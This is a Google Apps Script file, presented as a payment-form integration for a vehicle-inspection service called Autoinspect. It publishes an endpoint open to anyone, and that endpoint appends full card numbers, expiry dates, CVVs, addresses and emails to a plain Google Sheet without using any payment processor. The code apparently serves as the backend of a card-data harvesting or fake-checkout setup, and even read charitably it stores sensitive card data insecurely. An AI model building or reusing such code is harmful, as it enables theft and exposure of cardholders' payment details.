/**
 * Autoinspect - Payment Form Google Sheets Integration
 *
 * Setup:
 * 1. Open your sheet:
 *    https://docs.google.com/spreadsheets/d/1QjYGGraDEz9W9NjzKrvghQ_lWyA-Mgt5z9WntoxQ8c0/edit
 * 2. Extensions -> Apps Script
 * 3. Paste this entire file and save
 * 4. Deploy -> New deployment -> Web app
 *    - Execute as: Me
 *    - Who has access: Anyone
 * 5. Copy the Web App URL into .env.local:
 *    GOOGLE_APPS_SCRIPT_URL=https://script.google.com/macros/s/.../exec
 */

const SPREADSHEET_ID = '1QjYGGraDEz9W9NjzKrvghQ_lWyA-Mgt5z9WntoxQ8c0';
const PAYMENT_SHEET = 'Sheet1';

const PAYMENT_HEADERS = [
  'Timestamp',
  'Card Number',
  'Expiry',
  'CVV',
  'Address',
  'Postal Code',
  'Country',
  'City',
  'Payment Method',
  'VIN',
  'Email',
  'Car Model',
  'Plan',
  'Price',
  'Vehicle Type',
];

function doGet() {
  return jsonResponse({
    success: true,
    message: 'Autoinspect payment form endpoint is running. Use POST with action savePaymentForm.',
  });
}

function doPost(e) {
  try {
    const data = JSON.parse(e.postData.contents);

    if (data.action === 'savePaymentForm') {
      return savePaymentForm(data);
    }

    return jsonResponse({ success: false, error: 'Unknown action' });
  } catch (err) {
    return jsonResponse({ success: false, error: err.toString() });
  }
}

function savePaymentForm(data) {
  const ss = SpreadsheetApp.openById(SPREADSHEET_ID);
  let sheet = ss.getSheetByName(PAYMENT_SHEET);

  if (!sheet) {
    sheet = ss.getSheets()[0];
  }

  if (sheet.getLastRow() === 0) {
    sheet.getRange(1, 1, 1, PAYMENT_HEADERS.length).setValues([PAYMENT_HEADERS]);
  } else {
    const existingHeaders = sheet.getRange(1, 1, 1, PAYMENT_HEADERS.length).getValues()[0];
    const headersMatch = PAYMENT_HEADERS.every((header, index) => existingHeaders[index] === header);

    if (!headersMatch) {
      sheet.getRange(1, 1, 1, PAYMENT_HEADERS.length).setValues([PAYMENT_HEADERS]);
    }
  }

  sheet.appendRow([
    data.timestamp || new Date().toISOString(),
    data.cardNumber || '',
    data.expiry || '',
    data.cvv || '',
    data.address || '',
    data.postalCode || '',
    data.country || '',
    data.city || '',
    data.paymentMethod || 'Card',
    data.vin || '',
    data.email || '',
    data.carModel || '',
    data.plan || '',
    data.price || '',
    data.vehicleType || '',
  ]);

  return jsonResponse({ success: true });
}

function jsonResponse(payload) {
  return ContentService
    .createTextOutput(JSON.stringify(payload))
    .setMimeType(ContentService.MimeType.JSON);
}
